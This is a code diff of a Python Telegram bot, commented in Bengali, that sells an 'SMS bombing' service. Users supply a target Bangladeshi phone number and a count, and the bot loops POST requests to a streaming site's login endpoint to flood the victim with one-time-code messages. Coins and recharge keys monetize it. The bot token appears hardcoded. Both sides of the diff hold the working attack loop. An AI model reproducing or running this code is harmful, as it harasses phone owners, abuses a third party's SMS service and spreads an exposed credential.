@@ -9,42 +9,49 @@ from telebot import types
 # --- কনফিগারেশন ---
 TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
 ADMIN_ID = 6363065063 
-LOG_CHANNEL = "@sMsBotManagerDUModz" # চ্যানেলের ইউজারনেম
-REQUIRED_CHANNEL_ID = "@DemoTestDUModz" # চ্যানেলের ইউজারনেম
+LOG_CHANNEL = "@sMsBotManagerDUModz" 
+REQUIRED_CHANNEL = "@DemoTestDUModz" # এখানে @ অবশ্যই থাকবে
 LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"
 
+# বট অবজেক্ট (বাগ ফিক্সড)
 bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-# --- ডাটাবেস ফাংশন ---
-def load_db(file, default_val):
-    if not os.path.exists(file):
-        with open(file, 'w') as f: json.dump(default_val, f)
-    with open(file, 'r') as f: return json.load(f)
+# --- ডাটাবেস লোডার (অত্যন্ত শক্তিশালী) ---
+def load_db(file):
+    if not os.path.exists(file) or os.stat(file).st_size == 0:
+        with open(file, 'w') as f: json.dump({}, f)
+        return {}
+    with open(file, 'r') as f:
+        try: return json.load(f)
+        except: return {}
 
 def save_db(file, data):
     with open(file, 'w') as f: json.dump(data, f, indent=4)
 
-users = load_db('users.json', {})
-keys = load_db('keys.json', {})
+# গ্লোবাল ডাটাবেস লোড
+users = load_db('users.json')
+keys = load_db('keys.json')
 
-# --- সাবস্ক্রিপশন চেক ফাংশন ---
+# --- ভেরিফিকেশন চেক ফাংশন ---
 def is_joined(user_id):
     try:
-        member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
+        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
+        return status in ['member', 'administrator', 'creator']
+    except Exception as e:
+        print(f"Join Check Error: {e}")
         return False
 
-# --- অসাধারণ ওয়েলকাম এনিমেশন ---
-def send_fancy_welcome(chat_id, user_name):
-    msg = bot.send_message(chat_id, "🔍 **Checking Server Status...**")
-    time.sleep(0.8)
-    bot.edit_message_text("🛡️ **Security Protocol Verified...**", chat_id, msg.message_id)
-    time.sleep(0.8)
-    bot.edit_message_text("⚡ **Optimizing Smooth Connection...**", chat_id, msg.message_id)
-    time.sleep(0.8)
-    bot.delete_message(chat_id, msg.message_id)
-    
+# --- ওয়েলকাম এনিমেশন এবং মেনু ---
+def send_welcome_screen(chat_id, first_name):
+    # এনিমেশন ইফেক্ট
+    anim = bot.send_message(chat_id, "🔍 **Verifying Your Profile...**")
+    time.sleep(1)
+    bot.edit_message_text("🛡️ **Security Check Passed!**", chat_id, anim.message_id)
+    time.sleep(1)
+    bot.edit_message_text("⚡ **Loading DU ModZ Interface...**", chat_id, anim.message_id)
+    time.sleep(1)
+    bot.delete_message(chat_id, anim.message_id)
+
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
@@ -54,142 +61,131 @@ def send_fancy_welcome(chat_id, user_name):
         types.InlineKeyboardButton("🌐 Website", url="https://darkunkwonmodz.blogspot.com")
     )
     
-    caption = (f"🔥 **Welcome, {user_name}!** 🔥\n\n"
-               f"Welcome to **Dark Unkwon ModZ** System.\n"
-               f"Status: `Active` ✅\n"
-               f"Version: `2.0 (Bug Fixed)` ⚡\n\n"
-               f"আমাদের সার্ভিস ব্যবহার করার জন্য নিচের মেনু সিলেক্ট করুন।")
-    
+    caption = (f"🔥 **Welcome {first_name}!** 🔥\n"
+               f"---------------------------------\n"
+               f"👑 **Owner:** Dark Unkwon ModZ\n"
+               f"💰 **Status:** `Verified ✅`\n"
+               f"🚀 **Power:** `Ultra High Speed`\n"
+               f"---------------------------------")
     bot.send_photo(chat_id, LOGO_URL, caption=caption, reply_markup=markup)
 
-# --- স্টার্ট কমান্ড হ্যান্ডলার ---
+# --- কমান্ড হ্যান্ডলার ---
 @bot.message_handler(commands=['start'])
-def start(message):
+def start_cmd(message):
     uid = str(message.from_user.id)
     uname = message.from_user.first_name
     
-    # ইউজার ডাটাবেসে না থাকলে যুক্ত করা
+    # ইউজার ডাটাবেস আপডেট
     if uid not in users:
         users[uid] = {"coins": 30, "status": "active", "sent": 0}
         save_db('users.json', users)
-        try:
-            bot.send_message(LOG_CHANNEL, f"🆕 **New User Registered!**\nID: `{uid}`\nName: {uname}")
+        try: bot.send_message(LOG_CHANNEL, f"🆕 **New User:** [{uname}](tg://user?id={uid})")
         except: pass
 
-    # জয়েন চেকিং লজিক
+    # অটো ভেরিফাই চেক
     if is_joined(message.from_user.id):
-        send_fancy_welcome(message.chat.id, uname)
+        send_welcome_screen(message.chat.id, uname)
     else:
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/DemoTestDUModz"))
-        markup.add(types.InlineKeyboardButton("✅ Verify Joining", callback_data="verify_join"))
-        bot.send_photo(message.chat.id, LOGO_URL, 
-                       caption="⚠️ **অ্যাক্সেস ব্লক করা হয়েছে!**\n\nবটটি ব্যবহার করতে আপনাকে অবশ্যই আমাদের চ্যানেলে জয়েন করতে হবে। জয়েন করে নিচের 'Verify' বাটনে ক্লিক করুন।", 
-                       reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
+        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Verification Required!**\n\nPlease join our channel to use this bot.", reply_markup=markup)
 
-# --- কলব্যাক কুয়েরি হ্যান্ডলার ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_logic(call):
     uid = str(call.from_user.id)
     
-    if call.data == "verify_join":
+    if call.data == "verify":
         if is_joined(call.from_user.id):
-            bot.answer_callback_query(call.id, "✅ Verification Success!")
+            bot.answer_callback_query(call.id, "✅ Verified!")
             bot.delete_message(call.message.chat.id, call.message.message_id)
-            send_fancy_welcome(call.message.chat.id, call.from_user.first_name)
+            send_welcome_screen(call.message.chat.id, call.from_user.first_name)
         else:
-            bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন করেননি!", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)
 
     elif call.data == "profile":
-        u = users.get(uid)
-        bot.send_message(call.message.chat.id, 
-                         f"👤 **Your Stats**\n\n"
-                         f"💰 Coins: `{u['coins']}`\n"
-                         f"📊 Status: `{u['status'].upper()}`\n"
-                         f"🚀 Total Sent: `{u['sent']}`")
+        u = users.get(uid, {"coins":0, "status":"active", "sent":0})
+        bot.send_message(call.message.chat.id, f"👤 **User Info**\n💰 Coins: `{u['coins']}`\n📊 Status: `{u['status'].upper()}`\n🚀 Sent: `{u['sent']}`")
 
     elif call.data == "recharge":
-        msg = bot.send_message(call.message.chat.id, "🔑 **আপনার রিচার্জ Key দিন:**")
+        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Recharge Key:**")
         bot.register_next_step_handler(msg, process_recharge)
 
     elif call.data == "bomb":
-        if users[uid]['status'] == "blocked":
-            bot.send_message(call.message.chat.id, "🚫 **দুঃখিত!** আপনাকে ব্লক করা হয়েছে।")
+        if users.get(uid, {}).get('status') == "blocked":
+            bot.send_message(call.message.chat.id, "🚫 Blocked!")
             return
-        msg = bot.send_message(call.message.chat.id, "📱 **টার্গেট নাম্বার দিন (১১ ডিজিট):**")
+        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
         bot.register_next_step_handler(msg, get_number)
 
-# --- রিচার্জ লজিক (Key Expired System) ---
+# --- রিচার্জ লজিক ---
 def process_recharge(message):
     key = message.text.strip()
     uid = str(message.from_user.id)
     if key in keys:
-        amount = keys[key]
-        if amount == "lifetime":
-            users[uid]['status'] = "lifetime"
-        else:
-            users[uid]['coins'] += int(amount)
-        
-        del keys[key] # একবার ব্যবহার হলে ডিলিট
+        val = keys[key]
+        if val == "lifetime": users[uid]['status'] = "lifetime"
+        else: users[uid]['coins'] += int(val)
+        del keys[key] # Expire the key
         save_db('keys.json', keys)
         save_db('users.json', users)
-        bot.send_message(message.chat.id, "✅ **রিচার্জ সফল হয়েছে!** এই Key টি এখন এক্সপায়ার্ড হয়ে গেছে।")
+        bot.send_message(message.chat.id, "✅ **Success!** Coins added and key expired.")
     else:
-        bot.send_message(message.chat.id, "❌ **ভুল Key!** সঠিক Key দিন অথবা অ্যাডমিন থেকে কিনে নিন।")
+        bot.send_message(message.chat.id, "❌ Invalid Key!")
 
-# --- এসএমএস সেন্ডিং লজিক ---
+# --- এসএমএস লজিক ---
 def get_number(message):
     num = message.text
     if len(num) == 11 and num.isdigit():
-        msg = bot.send_message(message.chat.id, "🔢 **কয়টি এসএমএস পাঠাতে চান? (সর্বোচ্চ ১০০):**")
-        bot.register_next_step_handler(msg, lambda m: start_bomb(m, num))
+        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
+        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
     else:
-        bot.send_message(message.chat.id, "❌ সঠিক মোবাইল নাম্বার দিন!")
+        bot.send_message(message.chat.id, "❌ Wrong number!")
 
-def start_bomb(message, num):
+def start_attack(message, num):
     try:
         amount = int(message.text)
         uid = str(message.from_user.id)
         cost = amount * 5
-        
         if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
-            bot.send_message(message.chat.id, f"⚠️ **কয়েন নেই!** আপনার প্রয়োজন {cost} কয়েন।")
+            bot.send_message(message.chat.id, f"⚠️ Need {cost} coins!")
             return
-        
-        bot.send_message(message.chat.id, f"🚀 **{num} নাম্বারে অ্যাটাক শুরু হয়েছে...**")
-        threading.Thread(target=send_sms, args=(uid, num, amount, cost)).start()
-    except:
-        bot.send_message(message.chat.id, "❌ ভুল সংখ্যা দিয়েছেন!")
+        bot.send_message(message.chat.id, f"🚀 **Sent {amount} SMS to {num}...**")
+        threading.Thread(target=bombing, args=(uid, num, amount, cost)).start()
+    except: bot.send_message(message.chat.id, "❌ Error!")
 
-def send_sms(uid, num, amount, cost):
+def bombing(uid, num, amount, cost):
     url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
     payload = {"number": "+88" + num}
-    headers = {'Content-Type': 'application/json'}
-    
     success = 0
     for _ in range(amount):
         try:
-            r = requests.post(url, json=payload, headers=headers, timeout=5)
+            r = requests.post(url, json=payload, timeout=5)
             if r.status_code == 200: success += 1
         except: pass
         time.sleep(1)
-
-    if users[uid]['status'] != 'lifetime':
-        users[uid]['coins'] -= cost
+    if users[uid]['status'] != 'lifetime': users[uid]['coins'] -= cost
     users[uid]['sent'] += success
     save_db('users.json', users)
 
-# --- অ্যাডমিন প্যানেল ---
+# --- অ্যাডমিন ---
 @bot.message_handler(commands=['gen'])
-def gen_key(message):
+def gen(message):
     if message.from_user.id != ADMIN_ID: return
     try:
-        val = message.text.split()[1] # /gen 100 or /gen lifetime
-        key = "DU-MODZ-" + os.urandom(3).hex().upper()
-        keys[key] = val
+        val = message.text.split()[1]
+        k = "DU-" + os.urandom(3).hex().upper()
+        keys[k] = val
         save_db('keys.json', keys)
-        bot.reply_to(message, f"🔑 **Key Generated:** `{key}`\n💰 Value: {val}")
-    except:
-        bot.reply_to(message, "ব্যবহার: `/gen <amount/lifetime>`")
+        bot.reply_to(message, f"🔑 **Key:** `{k}`\nValue: {val}")
+    except: bot.reply_to(message, "/gen <amount>")
 
-bot.infinity_polling()
+# --- সলিড রান ---
+if __name__ == "__main__":
+    print("Bot is Running...")
+    while True:
+        try:
+            bot.infinity_polling(timeout=20, long_polling_timeout=10)
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
